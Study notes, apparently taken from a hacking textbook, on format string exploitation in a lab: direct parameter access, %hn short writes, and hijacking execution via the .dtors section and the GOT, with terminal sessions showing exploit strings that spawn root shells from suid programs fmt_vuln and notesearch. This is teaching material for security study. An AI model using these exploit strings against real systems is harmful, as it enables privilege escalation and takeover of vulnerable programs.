+In previous exploits, each of format parameter arguments had to be stepped through sequentially. This necessitated using several %x format parameters to step through parameter arguments until the beginning of the format string was reached. In addition, sequential nature required three 4 byte words of junk to properly write a full address to an arbitrary memory location. 
+
+Direc paramter access allows parameters to be access directly by using the dollar sign ($) qualifier. 
+
+%n$d would access nth parameter and display it as a decimal number
+
+printf("7th: %7$d, 4th: %4$05d\n", 10, 20, 30, 40, 50, 60, 70, 80);
+
+7th: 70, 4th: 00040
+
+This method of direct access eliminates need to step through memory until the beginning of the format string is located since this memory can be accessed directly. 
+
+reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
+The right way to print user-controlled input:
+AAAA%x%x%x%x
+The wrong way to print user-controlled input:
+AAAAbffff3d0b7fe75fc041414141
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
+The right way to print user-controlled input:
+AAAA%4$x
+The wrong way to print user-controlled input:
+AAAA41414141
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+reader@hacking:~/booksrc $
+
+In this example, beginning of format string is located at the 4th parameter argument. Instead of stepping through first three paramter arguments using %x, memory can be accessed directly. 
+
+Since this is being done on the command line and the $ sign is a special character, it must be escaped with a backslash. 
+
+Direct parameter access also simplifies writing of memory addresses. 
+
+Since memory can be accessed directly, there is no need for 4 byte spacers of junk datato increment the byte output count. 
+
+For example, let's write 0xbffffd72 into variable test_val
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08"
+. "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
+The right way to print user-controlled input:
+????????%4$n
+The wrong way to print user-controlled input:
+????????
+[*] test_val @ 0x08049794 = 16 0x00000010
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0x72 - 16
+$1 = 98
+(gdb) p 0xfd - 0x72
+$2 = 139
+(gdb) p 0xff - 0xfd
+$3 = 2
+(gdb) p 0x1ff - 0xfd
+$4 = 258
+(gdb) p 0xbf - 0xff
+$5 = -64
+(gdb) p 0x1bf - 0xff
+$6 = 192
+(gdb) quit
+reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08"
+. "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n
+The right way to print user-controlled input:
+????????%98x%4$n%139x%5$n
+The wrong way to print user-controlled input:
+????????
+bffff3c0
+b7fe75fc
+[*] test_val @ 0x08049794 = 64882 0x0000fd72
+reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08"
+. "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
+The right way to print user-controlled input:
+????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
+The wrong way to print user-controlled input:
+????????
+bffff3b0
+b7fe75fc
+0
+8049794
+[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
+reader@hacking:~/booksrc $
+
+Since stack does not need to be printed to reach the addresses the number of bytes written at the first format parameter is 16. 
+
+Direct Parameter Access is only used for the %n parameters, since it really doesn't matter what values are used for the %x spacers. 
+
+This method simplifies the process of writing an address and shrinks the mandatory size of the format string. 
+
+USING SHORT WRITES
+
+Short writes can also simplify format string exploits
+
+Short -> two byte word, and format paramters have special way of dealing with them. %h
+
+This can be used with format string exploits to write 2 byte shorts. 
+
+Naturally, direct parameter access can still be used. 
+
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08")%x%x%x%hn
+The right way to print user-controlled input:
+??%x%x%x%hn
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc0
+[*] test_val @ 0x08049794 = -65515 0xffff0015
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%x%x%x%hn
+The right way to print user-controlled input:
+??%x%x%x%hn
+The wrong way to print user-controlled input:
+??bffff3d0b7fe75fc0
+[*] test_val @ 0x08049794 = 1441720 0x0015ffb8
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08")%4\$hn
+The right way to print user-controlled input:
+??%4$hn
+The wrong way to print user-controlled input:
+??
+[*] test_val @ 0x08049794 = 327608 0x0004ffb8
+reader@hacking:~/booksrc $
+
+Using short writes, entire 4 byte value can be overwritten with just two %hn paramters. 
+
+The test_val variable can be overritten once again with address 0xbffffd72
+
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xfd72 - 8
+$1 = 64874
+(gdb) p 0xbfff - 0xfd72
+$2 = -15731
+(gdb) p 0x1bfff - 0xfd72
+$3 = 49805
+(gdb) quit
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08\x96\x97\x04\x08")%64874x%4\
+$hn%49805x%5\$hn
+The right way to print user-controlled input:
+????%64874x%4$hn%49805x%5$hn
+The wrong way to print user-controlled input:
+b7fe75fc
+[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
+reader@hacking:~/booksrc $
+
+Can use wraparound method if next short is smaller than first. Like in the case where 0xbfff is less than 0xfd72.
+
+But using short writes means the order of writes may not matter if the two passed addresses are swapped.
+
+gdb) p 0xbfff - 8
+$1 = 49143
+(gdb) p 0xfd72 - 0xbfff
+$2 = 15731
+(gdb) quit
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x97\x04\x08\x94\x97\x04\x08")%49143x%4\
+$hn%15731x%5\$hn
+The right way to print user-controlled input:
+????%49143x%4$hn%15731x%5$hn
+The wrong way to print user-controlled input:
+????
+b7fe75fc
+[*] test_val @ 0x08049794 = -1073742478 0xbffffd72
+reader@hacking:~/booksrc $
+
+The abilty to overwrite abitrary memory addresses implies the ability to control the execution flow of the program. 
+
+One option is to overwrite the return address in the most recent stack frame. 
+
+While this is possible, there are other targets that have more predictable memory addressees. 
+
+The natute of stack based overflows only allows the overwrite of return address, but format strings provide the ability to overwrite any memory address, which creates other possibilities. 
+
+DETOURS WITH .dtors
+
+In binary programs compiled with the GNU C compiler, special table sections called .dtors and .ctors are made for destructors and constructors, respectively. 
+
+Constructor function are exectured before the main() function is executed, and destructor functions are executed just before the main() function exits with an exit system call. 
+
+A function can be declared as a destructor function by defining the destructor attrinbute
+
+#include <stdio.h>
+#include <stdlib.h>
+static void cleanup(void) __attribute__ ((destructor));
+main() {
+printf("Some actions happen in the main() function..\n");
+printf("and then when main() exits, the destructor is called..\n");
+exit(0);
+}
+void cleanup(void) {
+printf("In the cleanup function now..\n");
+}
+
+cleanup() is automatically called when the main() function exists. 
+
+reader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c
+reader@hacking:~/booksrc $ ./dtors_sample
+Some actions happen in the main() function..
+and then when main() exits, the destructor is called..
+In the cleanup() function now..
+reader@hacking:~/booksrc $
+
+Bevhior of automatically executing a function on exit is controlled by .dtors table section of binary. This section is an array of 32 bit addresses terminatedby a NULL address. 
+
+.dtors array always begins with 0xffffffff and ends with NULL address 0x00000000. Between these two are the address of all the functions that have been declared with the destructor attribute
+
+nm -> can be used to find address of cleanup()
+
+objdump -> can be used to examine the binary
+
+nm will tell where functions are as well as where DTOR and CTOR end and begin with __DTOR_END__, __DTOR_LIST__, and same with CTOR
+
+If __DTORS_LIST__ is 0x080495ac, that means 0xffffffff should be contained at that address and 0x00000000 should be at address of __DTORS_END__
+
+Also means any destructor functions like addres to cleanup() should be located between __DTOR_LIST__ and __DTOR_END__
+
+objdump shows actual contents of dtors() section, although in a slightly confusing format. 
+
+reader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample
+./dtors_sample:
+file format elf32-i386
+Contents of section .dtors:
+80495ac ffffffff e8830408 00000000					............
+reader@hacking:~/booksrc $
+
+First value of 80495ac is simply showing the address where .dtors section is located. Then actual bytes are shown, opposed to DWORDS, which means the bytes are reversed. 
+
+Interesting detail about .dtors is that it is writable. 
+
+An object dump of the headers will verify this by showing that .dtors section isn't labeled READONLY
+
+objdump -h ./dtors_sample
+
+Another interesting detail about .dtors is that it is included in all binaries compiled with the GCC, regardlress of whether any functions were declared with the destructor attribute. 
+
+Means that the vulnerable format string program, fmt_vuln.c must have a .dtors section containing nothing. 
+
+Can be inspected using nm and objdump
+
+reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
+08049694 d __DTOR_END__
+08049690 d __DTOR_LIST__
+reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln
+./fmt_vuln:
+file format elf32-i386
+Contents of section .dtors:
+8049690 ffffffff 00000000
+reader@hacking:~/booksrc $
+
+As output shows, the distance between __DTOR_LIST__ and __DTOR_END__ is only 4 bytes this tme. Means no addresses between this. objdump verifies this
+
+Since .dtors section is writable, if address after 0xffffffff is overwritten with a memory address, the program's execution flow will be directed to that address when program exits. This is address of __DTOR_LIST__ plus four, which is also the same as __DTOR_END__ in this case. 
+
+If program is suid root, and this address can be overwritten, then it is possible to obtain a root shell. 
+
+Shellcode can be put into an environment variable, and address ca be predicted as usual. By subtracting name length, etc and multiplying two bytes for every extra byte. Plus getting the location from getenvaddr
+
+This address has to be written into .dtors section at 0x08049694 using format string vulnerability
+
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xbfff - 8
+$1 = 49143
+(gdb) p 0xf9ec - 0xbfff
+$2 = 14829
+(gdb) quit
+reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
+08049694 d __DTOR_END__
+08049690 d __DTOR_LIST__
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x96\x04\x08\x94\x96\x04\
+x08")%49143x%4\$hn%14829x%5\$hn
+The right way to print user-controlled input:
+????%49143x%4$hn%14829x%5$hn
+The wrong way to print user-controlled input:
+????
+b7fe75fc
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+sh-3.2# whoami
+root
+sh-3.2#
+
+Even though .dtors section isn't properly terminate with a NULL address, the shellcode address is still considered to be a destructor function. 
+
+When program exist, the shellcode will be called, spawning a root shell. 
+
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xbfff - 8
+$1 = 49143
+(gdb) p 0xf9ec - 0xbfff
+$2 = 14829
+(gdb) quit
+reader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR
+08049694 d __DTOR_END__
+08049690 d __DTOR_LIST__
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x96\x96\x04\x08\x94\x96\x04\
+x08")%49143x%4\$hn%14829x%5\$hn
+The right way to print user-controlled input:
+????%49143x%4$hn%14829x%5$hn
+The wrong way to print user-controlled input:
+????
+b7fe75fc
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+sh-3.2# whoami
+root
+sh-3.2#
+
+ANOTHER NOTESEARCH VULNERABILITY
+
+notesearch.c also has format string vulnerability. 
+
+A printf function reads note_buffer from file and prints contents of note without supplying its own format string. 
+
+While this buffer cannot be controlled from the command line, the vulnerability can be exploited by sending the right data to the file using the notetaker program and then opening thta note using the notesearch program. 
+
+Can add string with notetaker.c program to file
+
+Then serach for string with notesearch
+
+Can find out how far string format is stored in memory
+
+reader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e 'print "%x."x10')
+[DEBUG] buffer
+@ 0x804a008: 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'
+[DEBUG] datafile @ 0x804a070: '/var/notes'
+[DEBUG] file descriptor is 3
+Note has been saved.
+reader@hacking:~/booksrc $ ./notesearch AAAA
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+[DEBUG] found a 5 byte note for user id 999
+[DEBUG] found a 35 byte note for user id 999
+AAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .
+-------[ end of note data ]-------
+reader@hacking:~/booksrc $ ./notetaker BBBB%8\$x
+[DEBUG] buffer
+@ 0x804a008: 'BBBB%8$x'
+[DEBUG] datafile @ 0x804a070: '/var/notes'
+[DEBUG] file descriptor is 3
+Note has been saved.
+reader@hacking:~/booksrc $ ./notesearch BBBB
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+[DEBUG] found a 5 byte note for user id 999
+[DEBUG] found a 35 byte note for user id 999
+[DEBUG] found a 9 byte note for user id 999
+BBBB42424242
+-------[ end of note data ]-------
+reader@hacking:~/booksrc $
+
+Now that relative layout is known, exploitation is just a matter of overwriting .dtors section with the address of injected shellcode.
+
+reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
+reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
+SHELLCODE will be at 0xbffff9e8
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xbfff - 8
+$1 = 49143
+(gdb) p 0xf9e8 - 0xbfff
+$2 = 14825
+(gdb) quit
+reader@hacking:~/booksrc $ nm ./notesearch | grep DTOR
+08049c60 d __DTOR_END__
+08049c5c d __DTOR_LIST__
+reader@hacking:~/booksrc $ ./notetaker $(printf "\x62\x9c\x04\x08\x60\x9c\x04\
+x08")%49143x%8\$hn%14825x%9\$hn
+[DEBUG] buffer
+@ 0x804a008: 'b?`?%49143x%8$hn%14825x%9$hn'
+[DEBUG] datafile @ 0x804a070: '/var/notes'
+[DEBUG] file descriptor is 3
+Note has been saved.
+reader@hacking:~/booksrc $ ./notesearch 49143x
+[DEBUG] found a 34 byte note for user id 999
+[DEBUG] found a 41 byte note for user id 999
+[DEBUG] found a 5 byte note for user id 999
+[DEBUG] found a 35 byte note for user id 999
+[DEBUG] found a 9 byte note for user id 999
+[DEBUG] found a 33 byte note for user id 999
+21
+-------[ end of note data ]-------
+sh-3.2# whoami
+root
+sh-3.2#
+
+OVERWRITING THE GLOBAL OFFSET TABLE
+
+Procedure Linkage Table (PLT) - another special section in compiled programs that references all functions show program could use a function in a shared library many times
+
+This section consists of many jump instructions, each one corresponding to the address of a function
+
+Works like a springboard, each time a shared function needs to be called, control will pass through the PLT. 
+
+An object dump disssembling the PLT section in the fmt_vuln.c shows these jump instructions
+
+objdump -d -j .plt ./fmt_vuln
+
+One such instruction is associated with the exit() function, which is called at the end of the program. 
+
+If jump instruction used for th exit() function can be manipulated to direct the execution flow into shellcode instead ofthe exit() function, a root shell will be spawned. 
+
+Below, PLT is shown to be read only
+
+objdump -h ./fmt_vuln | grep -A1 "\ .plt\ "
+
+But closer examination of jump instructions revelas that they aren't jumping to addresses but to pointers to addresses. 
+
+For example, the actual address of the printf() function is stored as a pointer at memory address 0x08049780, and the exit() functoin's address stored at 0x08049784. Shown in objdump -d
+
+Global Offset Table (GOT) -> another section in compiled program where function addresses exist. These addresses can be obtained by displaying the dynamic relocation entries for the binary by using objdump. 
+
+objdump -R ./fmt_vuln
+
+Reveals that the address of exit() function is located in GOT at 0x08049784. If address of the shellcode is overwritten at this location, the program should call the shellcode when it thinks it's calling the exit() function. 
+
+Put shellcode in environment variable, predict location, and use format string vulnerability to write the value. 
+
+reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
+reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
+SHELLCODE will be at 0xbffff9ec
+reader@hacking:~/booksrc $ gdb -q
+(gdb) p 0xbfff - 8
+$1 = 49143
+(gdb) p 0xf9ec - 0xbfff
+$2 = 14829
+(gdb) quit
+reader@hacking:~/booksrc $ objdump -R ./fmt_vuln
+./fmt_vuln:
+file format elf32-i386
+DYNAMIC RELOCATION RECORDS
+OFFSET
+TYPE
+08049764 R_386_GLOB_DAT
+08049774 R_386_JUMP_SLOT
+08049778 R_386_JUMP_SLOT
+0804977c R_386_JUMP_SLOT
+08049780 R_386_JUMP_SLOT
+08049784 R_386_JUMP_SLOT
+VALUE
+__gmon_start__
+__gmon_start__
+__libc_start_main
+strcpy
+printf
+exit
+reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x86\x97\x04\x08\x84\x97\x04\
+x08")%49143x%4\$hn%14829x%5\$hn
+The right way to print user-controlled input:
+????%49143x%4$hn%14829x%5$hn
+The wrong way to print user-controlled input:
+????
+b7fe75fc
+[*] test_val @ 0x08049794 = -72 0xffffffb8
+sh-3.2# whoami
+root
+sh-3.2#
+
+When fmt_vuln.c tries to call exit(), the address of exit() is looked up in GOT and is jumped to via the PLT. Since actual address has been switched with address for the shellcode, a root shell is spawned.
+
+Another advantage of overwriting the GOT is that the GOT entries are fixed per binary, so a different system with the same binary will have the same GOT entry at the same address. 
+
+The ability to overwrite any arbitrary address opens up many possibilities for exploitation. 
+
+Any section of memory that is writable and contains an address that directs the flow of program excution can be targeted.
+
+
